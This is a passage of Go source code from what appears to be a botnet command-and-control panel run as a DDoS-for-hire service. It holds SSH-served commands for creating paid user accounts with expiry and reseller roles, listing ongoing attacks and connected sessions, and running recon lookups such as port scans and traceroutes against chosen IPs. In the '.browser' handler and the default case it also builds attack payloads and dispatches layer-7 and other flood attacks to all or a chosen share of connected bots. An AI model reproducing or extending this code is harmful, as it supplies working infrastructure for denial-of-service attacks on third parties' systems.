			//============================================================================================================================================================================================================================================================================//

		case "days":

			if !session.User.Admin {
				session.Conn.Write([]byte(ansiWarning + "You don't have the access for that!" + ansiReset + "\r\n"))
				continue
			}

			args := strings.Split(command, " ")[1:]

			if len(args) == 0 {
				status := ansiWarning + "disabled" + ansiReset
				if session.User.Expiry > 0 {
					expiryTime := time.Unix(session.User.Expiry, 0)
					status = fmt.Sprintf("%s%s%s", ansiNumbers, expiryTime.Format("2006-01-02 15:04:05"), ansiReset)
				}
				session.Conn.Write([]byte(ansiSystem + "Your expiry status: " + status + "\r\n" + ansiReset))
				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": days <number> <username>\r\n"))
				continue
			}

			if len(args) <= 1 {
				session.Conn.Write([]byte(ansiWarning + "You must provide a username & time" + ansiReset + "\r\n"))
				continue
			}

			days, err := strconv.Atoi(args[0])
			if err != nil {
				session.Conn.Write([]byte(ansiWarning + "You must provide a username & time" + ansiReset + "\r\n"))
				continue
			}

			user, err := FindUser(args[1])
			if err != nil || user == nil {
				session.Conn.Write([]byte(ansiError + "User doesnt exist" + ansiReset + "\r\n"))
				continue
			}

			if err := ModifyField(user, "expiry", time.Now().Add(time.Duration(days)*24*time.Hour).Unix()); err != nil {
				session.Conn.Write([]byte(ansiError + "Failed to modify users maxtime status" + ansiReset + "\r\n"))
				continue
			}

			session.Conn.Write([]byte(fmt.Sprintf("%sSuccessfully changed users expiry status to %s%d%s!%s\r\n", ansiSuccess, ansiNumbers, days, ansiSuccess, ansiReset)))
			continue

			// Create a new user
			//============================================================================================================================================================================================================================================================================//

		case "create":
			if !session.User.Admin && !session.User.Reseller {
				session.Conn.Write([]byte(ansiWarning + "Only admins/resellers can currently create users!" + ansiReset + "\r\n"))
				continue
			}

			args := make(map[string]string)
			order := []string{"username", "password", "days"}
			for pos := 1; pos < len(strings.Split(strings.ToLower(command), " ")); pos++ {
				if pos-1 >= len(order) {
					break
				}

				args[order[pos-1]] = strings.Split(strings.ToLower(command), " ")[pos]
			}

			// Allows allocation not inside the args
			for _, item := range order {
				if _, ok := args[item]; ok {
					continue
				}
				label := strings.ToUpper(item[:1]) + item[1:]
				value, err := readSSHLine(conn, fmt.Sprintf("%s%s%s %s->%s %s", ansiSeparator, label, ansiReset, ansiSeparator, ansiReset, ansiCommands), "", 40, []string{})
				if err != nil {
					return
				}
				args[item] = value
			}

			if usr, _ := FindUser(args["username"]); usr != nil {
				session.Conn.Write([]byte(ansiWarning + "User already exists in SQL!" + ansiReset + "\r\n"))
				continue
			}

			expiry, err := strconv.Atoi(args["days"])
			if err != nil {
				session.Conn.Write([]byte(ansiWarning + "Days active must be a int!" + ansiReset + "\r\n"))
				continue
			}

			// Inserts the user into the database
			err = CreateUser(&User{Username: args["username"], Password: args["password"], Maxtime: Options.Templates.Database.Defaults.Maxtime, Admin: Options.Templates.Database.Defaults.Admin, API: Options.Templates.Database.Defaults.API, Cooldown: Options.Templates.Database.Defaults.Cooldown, Conns: Options.Templates.Database.Defaults.Concurrents, MaxDaily: Options.Templates.Database.Defaults.MaxDaily, NewUser: true, Expiry: time.Now().Add(time.Duration(expiry) * time.Hour * 24).Unix()})
			if err != nil {
				session.Conn.Write([]byte(ansiError + "Error creating user inside the database!" + ansiReset + "\r\n"))
				continue
			}

			session.Conn.Write([]byte(ansiSuccess + "User created successfully" + ansiReset + "\r\n"))
			continue

			// Remove an existing user
			//============================================================================================================================================================================================================================================================================//

		case "remove":
			if !session.User.Admin {
				session.Conn.Write([]byte(ansiWarning + "You need admin access for this command" + ansiReset + "\r\n"))
				continue
			}

			args := strings.Fields(command)[1:] // Usa Fields para mejor manejo

			//usage si solo se pone "remove" sin argumentos
			if len(args) == 0 {
				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": remove <username>\r\n"))
				continue
			}

			if len(args) < 1 {
				session.Conn.Write([]byte(ansiWarning + "You must provide a username" + ansiReset + "\r\n"))
				continue
			}

			username := args[0]
			usr, err := FindUser(username)
			if err != nil || usr == nil {
				session.Conn.Write([]byte(ansiError + "Unknown username" + ansiReset + "\r\n"))
				continue
			}

			if err := RemoveUser(username); err != nil {
				session.Conn.Write([]byte(ansiError + "Failed to remove user" + ansiReset + "\r\n"))
				continue
			}

			session.Conn.Write([]byte(ansiSuccess + "Removed the user!" + ansiReset + "\r\n"))
			continue

			// Broadcast a message to all connected clients
			//============================================================================================================================================================================================================================================================================//

		case "broadcast":
			if !session.User.Admin {
				session.Conn.Write([]byte(ansiWarning + "You need admin access for this command" + ansiReset + "\r\n"))
				continue
			}

			args := strings.Fields(command)[1:]
			if len(args) == 0 {
				session.Conn.Write([]byte(ansiSystem + "Broadcast a message to all connected clients\r\n" + ansiReset))
				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": broadcast <message>\r\n"))
				continue
			}

			message := strings.Join(args, " ")
			for _, s := range Sessions {
				s.Conn.Write([]byte("\x1b[0m\x1b7\x1b[1A\r\x1b[2K " + ansiSeparator + "[BROADCAST]" + ansiReset + " " + ansiSystem + message + ansiReset + "\x1b8"))
			}
			session.Conn.Write([]byte(ansiSuccess + "Broadcast sent\r\n" + ansiReset))
			continue

			// Users command to see all users in the database and their info
			//============================================================================================================================================================================================================================================================================//

		case "users":
			if !session.User.Admin {
				session.Conn.Write([]byte(ansiWarning + "You need admin access for this command" + ansiReset + "\r\n"))
				continue
			}

			users, err := GetUsers()
			if err != nil {
				session.Conn.Write([]byte(ansiError + "Err: " + err.Error() + ansiReset + "\r\n"))
				continue
			}

			new := simpletable.New()
			new.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: ansiSeparator + "#" + ansiReset},
					{Align: simpletable.AlignCenter, Text: ansiSeparator + "User" + ansiReset},
					{Align: simpletable.AlignCenter, Text: ansiSeparator + "Time" + ansiReset},
					{Align: simpletable.AlignCenter, Text: ansiSeparator + "Conns" + ansiReset},
					{Align: simpletable.AlignCenter, Text: ansiSeparator + "Cooldown" + ansiReset},
					{Align: simpletable.AlignCenter, Text: ansiSeparator + "MaxDaily" + ansiReset},
					{Align: simpletable.AlignCenter, Text: ansiSeparator + "Admin" + ansiReset},
					{Align: simpletable.AlignCenter, Text: ansiSeparator + "Reseller" + ansiReset},
					{Align: simpletable.AlignCenter, Text: ansiSeparator + "API" + ansiReset},
				},
			}

			for _, u := range users {
				row := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: ansiNumbers + fmt.Sprint(u.ID) + ansiReset},
					{Align: simpletable.AlignCenter, Text: ansiPrimary + fmt.Sprint(u.Username) + ansiReset},
					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("%s%d%s", ansiNumbers, u.Maxtime, ansiReset)},
					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("%s%d%s", ansiNumbers, u.Conns, ansiReset)},
					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("%s%d%s", ansiNumbers, u.Cooldown, ansiReset)},
					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("%s%d%s", ansiNumbers, u.MaxDaily, ansiReset)},
					{Align: simpletable.AlignCenter, Text: FormatBool(u.Admin)},
					{Align: simpletable.AlignCenter, Text: FormatBool(u.Reseller)},
					{Align: simpletable.AlignCenter, Text: FormatBool(u.API)},
				}

				new.Body.Cells = append(new.Body.Cells, row)
			}

			new.SetStyle(simpletable.StyleCompactLite)
			colored := colorTableBorders(new.String())
			session.Conn.Write([]byte(strings.ReplaceAll(colored, "\n", "\r\n") + "\r\n"))
			continue

			// Ongoing attacks command to see all ongoing attacks and their info
			//============================================================================================================================================================================================================================================================================//

		case "ongoing": // Global ongoing attacks

			new := simpletable.New()
			new.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: ansiSeparator + "#" + ansiReset},
					{Align: simpletable.AlignCenter, Text: ansiSeparator + "Target" + ansiReset},
					{Align: simpletable.AlignCenter, Text: ansiSeparator + "Duration" + ansiReset},
					{Align: simpletable.AlignCenter, Text: ansiSeparator + "User" + ansiReset},
					{Align: simpletable.AlignCenter, Text: ansiSeparator + "Finish" + ansiReset},
				},
			}

			ongoing, err := OngoingAttacks(time.Now())
			if err != nil {
				session.Conn.Write([]byte(ansiError + "Cant fetch ongoing attacks" + ansiReset + "\r\n"))
				continue
			}

			for i, attack := range ongoing {
				row := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: ansiNumbers + fmt.Sprint(i) + ansiReset},
					{Align: simpletable.AlignCenter, Text: ansiPrimary + fmt.Sprint(attack.Target) + ansiReset},
					{Align: simpletable.AlignCenter, Text: ansiNumbers + fmt.Sprint(attack.Duration) + ansiReset},
					{Align: simpletable.AlignCenter, Text: ansiPrimary + fmt.Sprint(attack.User) + ansiReset},
					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("%s%.2fsecs%s", ansiNumbers, time.Until(time.Unix(attack.Finish, 0)).Seconds(), ansiReset)},
				}

				new.Body.Cells = append(new.Body.Cells, row)
			}

			new.SetStyle(simpletable.StyleCompactLite)
			colored := colorTableBorders(new.String())
			session.Conn.Write([]byte(strings.ReplaceAll(colored, "\n", "\r\n") + "\r\n"))
			continue

			// Sessions command to see all connected sessions and their info
			// //============================================================================================================================================================================================================================================================================//

		case "sessions":
			if !session.User.Admin {
				session.Conn.Write([]byte(ansiWarning + "You need admin access for this command" + ansiReset + "\r\n"))
				continue
			}

			new := simpletable.New()
			new.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: ansiSeparator + "#" + ansiReset},
					{Align: simpletable.AlignCenter, Text: ansiSeparator + "User" + ansiReset},
					{Align: simpletable.AlignCenter, Text: ansiSeparator + "IP" + ansiReset},
					{Align: simpletable.AlignCenter, Text: ansiSeparator + "Admin" + ansiReset},
					{Align: simpletable.AlignCenter, Text: ansiSeparator + "Reseller" + ansiReset},
					{Align: simpletable.AlignCenter, Text: ansiSeparator + "API" + ansiReset},
				},
			}

			for i, u := range Sessions {
				row := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: ansiNumbers + fmt.Sprint(i) + ansiReset},
					{Align: simpletable.AlignCenter, Text: ansiPrimary + fmt.Sprint(u.User.Username) + ansiReset},
					{Align: simpletable.AlignCenter, Text: ansiPrimary + strings.Join(strings.Split(u.Conn.RemoteAddr().String(), ":")[:len(strings.Split(u.Conn.RemoteAddr().String(), ":"))-1], ":") + ansiReset},
					{Align: simpletable.AlignCenter, Text: FormatBool(u.User.Admin)},
					{Align: simpletable.AlignCenter, Text: FormatBool(u.User.Reseller)},
					{Align: simpletable.AlignCenter, Text: FormatBool(u.User.API)},
				}

				new.Body.Cells = append(new.Body.Cells, row)
			}

			new.SetStyle(simpletable.StyleCompactLite)
			colored := colorTableBorders(new.String())
			session.Conn.Write([]byte(strings.ReplaceAll(colored, "\n", "\r\n") + "\r\n"))
			continue

			// Functions//
			// ==========================================================================================================================================================================================================================================================================//

			// IP lookup command to get geolocation information about an IP address using the hackertarget API
			//============================================================================================================================================================================================================================================================================//

		case "iplookup":
			args := strings.Fields(command)[1:]

			if len(args) == 0 {
				session.Conn.Write([]byte(ansiSystem + "Lookup geolocation information for an IP address\r\n" + ansiReset))
				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": iplookup <ip>\r\n"))
				continue
			}

			ipAddress := args[0]

			url := "https://api.hackertarget.com/geoip/?q=" + ipAddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			response, err := client.Get(url)
			if err != nil {
				session.Conn.Write([]byte(ansiError + "Failed to lookup IP. Please try again later." + ansiReset + "\r\n"))
				continue
			}

			responseData, err := ioutil.ReadAll(response.Body)
			if err != nil {
				session.Conn.Write([]byte(ansiError + "Failed to read response. Please try again later." + ansiReset + "\r\n"))
				continue
			}

			responseString := string(responseData)
			formatted := strings.ReplaceAll(responseString, "\n", "\r\n")
			session.Conn.Write([]byte(ansiSuccess + "Results" + ansiReset + ":\r\n" + formatted + "\r\n"))
			continue

			// Port scan command to scan for open ports on an IP address using the hackertarget API
			//============================================================================================================================================================================================================================================================================//

		case "portscan":
			args := strings.Fields(command)[1:]

			if len(args) == 0 {
				session.Conn.Write([]byte(ansiSystem + "Perform a port scan on an IP address\r\n" + ansiReset))
				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": portscan <ip>\r\n"))
				continue
			}

			ipAddress := args[0]

			url := "https://api.hackertarget.com/nmap/?q=" + ipAddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			response, err := client.Get(url)
			if err != nil {
				session.Conn.Write([]byte(ansiError + "Failed to scan ports. Please try again later." + ansiReset + "\r\n"))
				continue
			}

			responseData, err := ioutil.ReadAll(response.Body)
			if err != nil {
				session.Conn.Write([]byte(ansiError + "Failed to read response. Please try again later." + ansiReset + "\r\n"))
				continue
			}

			responseString := string(responseData)
			formatted := strings.ReplaceAll(responseString, "\n", "\r\n")
			session.Conn.Write([]byte(ansiSuccess + "Results" + ansiReset + ":\r\n" + formatted + "\r\n"))
			continue

		// Whois command to lookup WHOIS information for an IP address using the hackertarget API
		//============================================================================================================================================================================================================================================================================//

		case "whois":
			args := strings.Fields(command)[1:]

			if len(args) == 0 {
				session.Conn.Write([]byte(ansiSystem + "Lookup WHOIS information for an IP address\r\n" + ansiReset))
				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": whois <ip>\r\n"))
				continue
			}

			ipAddress := args[0]

			url := "https://api.hackertarget.com/whois/?q=" + ipAddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			response, err := client.Get(url)
			if err != nil {
				session.Conn.Write([]byte(ansiError + "Failed to lookup WHOIS. Please try again later." + ansiReset + "\r\n"))
				continue
			}

			responseData, err := ioutil.ReadAll(response.Body)
			if err != nil {
				session.Conn.Write([]byte(ansiError + "Failed to read response. Please try again later." + ansiReset + "\r\n"))
				continue
			}

			responseString := string(responseData)
			formatted := strings.ReplaceAll(responseString, "\n", "\r\n")
			session.Conn.Write([]byte(ansiSuccess + "Results" + ansiReset + ":\r\n" + formatted + "\r\n"))
			continue

		// Ping command to perform a ping on an IP address using the hackertarget API
		//============================================================================================================================================================================================================================================================================//

		case "ping":
			args := strings.Fields(command)[1:]

			if len(args) == 0 {
				session.Conn.Write([]byte(ansiSystem + "Perform a ping on an IP address\r\n" + ansiReset))
				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": ping <ip>\r\n"))
				continue
			}

			ipAddress := args[0]

			url := "https://api.hackertarget.com/nping/?q=" + ipAddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 60 * time.Second}
			response, err := client.Get(url)
			if err != nil {
				session.Conn.Write([]byte(ansiError + "Failed to ping. Please try again later." + ansiReset + "\r\n"))
				continue
			}

			responseData, err := ioutil.ReadAll(response.Body)
			if err != nil {
				session.Conn.Write([]byte(ansiError + "Failed to read response. Please try again later." + ansiReset + "\r\n"))
				continue
			}

			responseString := string(responseData)
			formatted := strings.ReplaceAll(responseString, "\n", "\r\n")
			session.Conn.Write([]byte(ansiSuccess + "Results" + ansiReset + ":\r\n" + formatted + "\r\n"))
			continue

		// Traceroute command to perform a traceroute on an IP address using the hackertarget API
		//============================================================================================================================================================================================================================================================================//

		case "traceroute":
			args := strings.Fields(command)[1:]

			if len(args) == 0 {
				session.Conn.Write([]byte(ansiSystem + "Perform a traceroute on an IP address\r\n" + ansiReset))
				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": traceroute <ip>\r\n"))
				continue
			}

			ipAddress := args[0]

			url := "https://api.hackertarget.com/mtr/?q=" + ipAddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 60 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 60 * time.Second}
			response, err := client.Get(url)
			if err != nil {
				session.Conn.Write([]byte(ansiError + "Failed to traceroute. Please try again later." + ansiReset + "\r\n"))
				continue
			}

			responseData, err := ioutil.ReadAll(response.Body)
			if err != nil {
				session.Conn.Write([]byte(ansiError + "Failed to read response. Please try again later." + ansiReset + "\r\n"))
				continue
			}

			responseString := string(responseData)
			formatted := strings.ReplaceAll(responseString, "\n", "\r\n")
			session.Conn.Write([]byte(ansiSuccess + "Results" + ansiReset + ":\r\n" + formatted + "\r\n"))
			continue

		// Resolve command to resolve the IP addresses associated with a domain using the hackertarget API
		//============================================================================================================================================================================================================================================================================//

		case "resolve":
			args := strings.Fields(command)[1:]

			if len(args) == 0 {
				session.Conn.Write([]byte(ansiSystem + "Resolve DNS for a domain\r\n" + ansiReset))
				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": resolve <domain>\r\n"))
				continue
			}

			domain := args[0]

			url := "https://api.hackertarget.com/hostsearch/?q=" + domain
			tr := &http.Transport{
				ResponseHeaderTimeout: 15 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 15 * time.Second}
			response, err := client.Get(url)
			if err != nil {
				session.Conn.Write([]byte(ansiError + "Failed to resolve domain. Please try again later." + ansiReset + "\r\n"))
				continue
			}

			responseData, err := ioutil.ReadAll(response.Body)
			if err != nil {
				session.Conn.Write([]byte(ansiError + "Failed to read response. Please try again later." + ansiReset + "\r\n"))
				continue
			}

			responseString := string(responseData)
			formatted := strings.ReplaceAll(responseString, "\n", "\r\n")
			session.Conn.Write([]byte(ansiSuccess + "Results" + ansiReset + ":\r\n" + formatted + "\r\n"))
			continue

		// Reverse DNS lookup command to get the domain associated with an IP address using the hackertarget API
		//============================================================================================================================================================================================================================================================================//

		case "reversedns":
			args := strings.Fields(command)[1:]

			if len(args) == 0 {
				session.Conn.Write([]byte(ansiSystem + "Perform a reverse DNS lookup on an IP address\r\n" + ansiReset))
				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": reversedns <ip>\r\n"))
				continue
			}

			ipAddress := args[0]

			url := "https://api.hackertarget.com/reverseiplookup/?q=" + ipAddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			response, err := client.Get(url)
			if err != nil {
				session.Conn.Write([]byte(ansiError + "Failed to lookup reverse DNS. Please try again later." + ansiReset + "\r\n"))
				continue
			}

			responseData, err := ioutil.ReadAll(response.Body)
			if err != nil {
				session.Conn.Write([]byte(ansiError + "Failed to read response. Please try again later." + ansiReset + "\r\n"))
				continue
			}

			responseString := string(responseData)
			formatted := strings.ReplaceAll(responseString, "\n", "\r\n")
			session.Conn.Write([]byte(ansiSuccess + "Results" + ansiReset + ":\r\n" + formatted + "\r\n"))
			continue

		// ASN lookup command to lookup ASN information for an IP address using the hackertarget API
		//============================================================================================================================================================================================================================================================================//

		case "asnlookup":
			args := strings.Fields(command)[1:]

			if len(args) == 0 {
				session.Conn.Write([]byte(ansiSystem + "Lookup ASN information for an IP address\r\n" + ansiReset))
				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": asnlookup <ip>\r\n"))
				continue
			}

			ipAddress := args[0]

			url := "https://api.hackertarget.com/aslookup/?q=" + ipAddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 15 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 15 * time.Second}
			response, err := client.Get(url)
			if err != nil {
				session.Conn.Write([]byte(ansiError + "Failed to lookup ASN. Please try again later." + ansiReset + "\r\n"))
				continue
			}

			responseData, err := ioutil.ReadAll(response.Body)
			if err != nil {
				session.Conn.Write([]byte(ansiError + "Failed to read response. Please try again later." + ansiReset + "\r\n"))
				continue
			}

			responseString := string(responseData)
			formatted := strings.ReplaceAll(responseString, "\n", "\r\n")
			session.Conn.Write([]byte(ansiSuccess + "Results" + ansiReset + ":\r\n" + formatted + "\r\n"))
			continue

		//BROWSER	CASE
		//============================================================================================================================================================================================================================================================================//

		case ".browser":
			args := strings.Fields(command)
			if len(args) != 4 { // .browser + url + time + rate
				session.Conn.Write([]byte(ansiError + "Usage: .browser <url> <time> <rate>" + ansiReset + "\r\n"))
				continue
			}
			// args[1] = url, args[2] = time, args[3] = rate
			attack, err := ParseL7Attack("browser", args[1:], session.User)
			if err != nil {
				session.Conn.Write([]byte(ansiError + err.Error() + ansiReset + "\r\n"))
				continue
			}
			SendL7Attack(attack)
			face := redGradientText("X_X")
			session.Conn.Write([]byte(ansiSuccess + "Attack" + ansiReset + " " + ansiCommands + "sent successfully to " + attack.URL + " for " + strconv.Itoa(attack.Duration) + " seconds " + face + ansiReset + "\r\n"))
			continue

			//Default case handles attack commands and unknown commands
			//============================================================================================================================================================================================================================================================================//
		default:
			args := strings.Fields(command)
			if len(args) == 0 {
				continue
			}
			methodName := strings.ToLower(args[0])

			customBots := 0
			abort := false
			if session.User.Admin {
				newArgs := make([]string, 0, len(args))
				for _, arg := range args {
					if strings.HasPrefix(strings.ToLower(arg), "bots=") {
						parts := strings.SplitN(arg, "=", 2)
						if len(parts) == 2 {
							val, err := strconv.Atoi(parts[1])
							if err != nil {
								session.Conn.Write([]byte(ansiError + "Invalid bots value, must be integer" + ansiReset + "\r\n"))
								abort = true
								break
							}
							customBots = val
						}
						continue
					}
					newArgs = append(newArgs, arg)
				}
				args = newArgs
			} else {
				for _, arg := range args {
					if strings.HasPrefix(strings.ToLower(arg), "bots=") {
						session.Conn.Write([]byte(ansiError + "You are not allowed to use 'bots' flag" + ansiReset + "\r\n"))
						abort = true
						break
					}
				}
			}
			if abort {
				continue
			}

			// Si el método es .http y hay suficientes argumentos, parsear URL
			if methodName == ".http" && len(args) >= 3 {
				u, err := url.Parse(args[1])
				if err != nil || u.Host == "" {
					session.Conn.Write([]byte(ansiError + "Invalid URL" + ansiReset + "\r\n"))
					continue
				}
				host := u.Hostname()
				if host == "" {
					session.Conn.Write([]byte(ansiError + "Missing host in URL" + ansiReset + "\r\n"))
					continue
				}
				port := u.Port()
				if port == "" {
					if u.Scheme == "https" {
						port = "443"
					} else {
						port = "80"
					}
				}
				path := u.RequestURI()
				if path == "" {
					path = "/"
				}

				newArgs := make([]string, 0, len(args)+3)
				newArgs = append(newArgs, args[0]) // método
				newArgs = append(newArgs, host)    // destino
				newArgs = append(newArgs, args[2]) // duración
				if len(args) > 3 {
					newArgs = append(newArgs, args[3:]...)
				}
				newArgs = append(newArgs, "domain="+host)
				newArgs = append(newArgs, "path="+path)
				newArgs = append(newArgs, "dport="+port)

				args = newArgs
				methodName = strings.ToLower(args[0])
			}

			// Validar que el método existe
			attack, ok := IsMethod(methodName)
			if !ok {
				session.Conn.Write([]byte(fmt.Sprintf("%sUnknown command:%s %s%s%s\r\n", ansiError, ansiReset, ansiCommands, methodName, ansiReset)))
				continue
			}

			// Parsear el ataque
			payload, err := attack.Parse(args, account)
			if err != nil {
				session.Conn.Write([]byte(ansiError + err.Error() + ansiReset + "\r\n"))
				continue
			}

			// Generar el slice de bytes
			bytes, err := payload.Bytes()
			if err != nil {
				session.Conn.Write([]byte(ansiError + "Failed to build attack: " + err.Error() + ansiReset + "\r\n"))
				continue
			}

			totalBots := len(Clients)
			var botsToUse int

			if customBots != 0 {
				// Administrador especificó un número
				if customBots == -1 {
					botsToUse = totalBots
				} else if customBots > 0 && customBots <= totalBots {
					botsToUse = customBots
				} else {
					session.Conn.Write([]byte(ansiError + fmt.Sprintf("Invalid bots value: %d. Must be -1, or between 1 and %d", customBots, totalBots) + ansiReset + "\r\n"))
					continue
				}
			} else {
				// Lógica de fracción por máximo global
				maxOngoing := Options.Templates.Attacks.MaximumOngoing
				if maxOngoing > 1 {
					botsToUse = totalBots / maxOngoing
					if botsToUse < 1 {
						botsToUse = 1
					}
				} else {
					botsToUse = totalBots
				}
			}

			// Enviar a la cantidad calculada
			if botsToUse >= totalBots {
				BroadcastClients(bytes)
			} else {
				BroadcastClientsFraction(bytes, botsToUse)
			}

			// --- NUEVA SALIDA CON FORMATO DE LISTA ---
			// Obtener método, target y duración del comando original (sin la flag bots)
			parts := strings.Fields(command)
			methodDisplay := parts[0]
			targetDisplay := "unknown"
			durationDisplay := "?"
			if len(parts) > 1 {
				targetDisplay = parts[1]
			}
			if len(parts) > 2 {
				durationDisplay = parts[2]
			}

			// Construir la lista de flags (excluyendo "bots=" si existe)
			flagsList := make([]string, 0)
			for i := 3; i < len(parts); i++ {
				if !strings.HasPrefix(strings.ToLower(parts[i]), "bots=") {
					flagsList = append(flagsList, parts[i])
				}
			}
			flagsStr := strings.Join(flagsList, " ")

			botsDisplay := fmt.Sprintf("[%d/%d]", botsToUse, totalBots)

			// Escribir cada línea con formato
			session.Conn.Write([]byte(ansiSuccess + "• Attack Sent!" + ansiReset + "\r\n"))
			session.Conn.Write([]byte(fmt.Sprintf("%s• Method\t: %s[%s]%s\r\n", ansiCommands, ansiNumbers, methodDisplay, ansiReset)))
			session.Conn.Write([]byte(fmt.Sprintf("%s• Target\t: %s[%s]%s\r\n", ansiCommands, ansiNumbers, targetDisplay, ansiReset)))
			session.Conn.Write([]byte(fmt.Sprintf("%s• Duration\t: %s[%s]%s\r\n", ansiCommands, ansiNumbers, durationDisplay, ansiReset)))
			if flagsStr != "" {
				session.Conn.Write([]byte(fmt.Sprintf("%s• Flags\t\t: %s[%s]%s\r\n", ansiCommands, ansiNumbers, flagsStr, ansiReset)))
			} else {
				session.Conn.Write([]byte(fmt.Sprintf("%s• Flags\t\t: %s[none]%s\r\n", ansiCommands, ansiNumbers, ansiReset)))
			}
			session.Conn.Write([]byte(fmt.Sprintf("%s• Bots\t\t: %s%s%s\r\n", ansiCommands, ansiNumbers, botsDisplay, ansiReset)))
		}
	}
}
